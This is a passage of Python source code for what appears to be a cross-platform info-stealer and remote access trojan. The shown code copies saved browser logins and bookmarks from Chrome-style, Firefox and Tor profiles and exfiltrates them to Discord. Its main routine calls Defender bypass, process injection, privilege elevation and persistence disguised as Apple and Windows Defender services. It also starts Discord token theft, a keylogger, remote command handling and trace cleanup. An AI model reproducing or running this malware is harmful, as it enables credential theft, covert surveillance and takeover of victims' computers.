                    data.append((f"{name} Bookmarks", subprocess.getoutput(f"plutil -p {bookmarks}")))
            elif name == "Firefox" or name == "Tor":
                profile = glob.glob(os.path.join(path, "*.default*"))[0] if glob.glob(os.path.join(path, "*.default*")) else None
                if profile:
                    logins = os.path.join(profile, "logins.json")
                    if os.path.exists(logins):
                        with open(logins, "r") as f:
                            logins_data = json.load(f)
                        logins_str = ""
                        for login in logins_data.get("logins", []):
                            logins_str += f"URL: {login.get('hostname')}, User: {login.get('username')}, Pass: [Encrypted]\n"
                        data.append((f"{name} Logins", logins_str))
            else:
                login_db = os.path.join(path, "Login Data")
                if os.path.exists(login_db):
                    temp_db = "/tmp/login.db" if not IS_WINDOWS else os.path.join(os.getenv("TEMP"), "login.db")
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    c = conn.cursor()
                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
                    logins_str = ""
                    for row in c.fetchall():
                        url, user, pwd = row
                        logins_str += f"URL: {url}, User: {user}, Pass: [Encrypted]\n"
                    data.append((f"{name} Logins", logins_str))
                    conn.close()
                    os.remove(temp_db)
        except Exception as e:
            data.append((f"{name} Error", str(e)))
    formatted_data = "\n".join(f"[{section}]:\n{content}" for section, content in data)
    send_to_discord(formatted_data)

def update_code(new_code):
    with open(HIDE_FILE, "w") as f:
        f.write(new_code)
    subprocess.Popen([sys.executable, HIDE_FILE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os._exit(0)

def selfdestruct():
    cleanup_instance()
    if IS_MAC:
        plist = Path("~/Library/LaunchAgents/com.apple.systemupdate.plist").expanduser()
        if plist.exists():
            subprocess.run(["launchctl", "unload", str(plist)], check=False, timeout=10)
            plist.unlink()
    elif IS_WINDOWS:
        subprocess.run('schtasks /delete /tn "WindowsDefenderHealthService" /f', shell=True, timeout=10)
        from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, OpenKey, DeleteValue
        try:
            with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS) as key:
                DeleteValue(key, "WindowsDefenderHealth")
        except Exception:
            pass
    else:
        subprocess.run("crontab -r", shell=True, timeout=10)
    if not TEST_MODE:
        shutil.rmtree(HIDE_DIR, ignore_errors=True)
    os._exit(0)

# Multithreaded Functions
def thread_selfie():
    selfie()

def thread_screenshot():
    screenshot()

def thread_userinfo():
    userinfo()

def thread_run_commands(cmd):
    run_commands(cmd)

def thread_juggthatmf():
    juggthatmf()

def thread_update_code(new_code):
    update_code(new_code)

def thread_selfdestruct():
    selfdestruct()

def thread_harvest():
    harvest_system_data()

# Main Execution
def main():
    if not is_safe_environment():
        logging.error("Unsafe environment detected")
        return
    manage_instance()
    bypass_defender()
    process_injection()
    if not ensure_dependencies():
        print("Some dependencies failed to install. Proceeding with limited functionality.")
    fake_dependency_updates()
    is_admin = attempt_admin_elevation()
    persist()
    bypass_permissions()
    threading.Thread(target=initial_harvest, args=(is_admin,), daemon=True).start()
    threading.Thread(target=periodic_harvest, args=(is_admin,), daemon=True).start()
    threading.Thread(target=steal_discord_tokens, daemon=True).start()
    threading.Thread(target=cross_platform_keylogger, daemon=True).start()
    threading.Thread(target=thread_harvest, daemon=True).start()
    command_handler = CommandHandler()
    while True:
        command_handler.fetch_commands()
        time.sleep(random_interval())
        clean_traces()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main error: {e}")
        send_to_discord(f"Main Error: {e}")
        os._exit(1)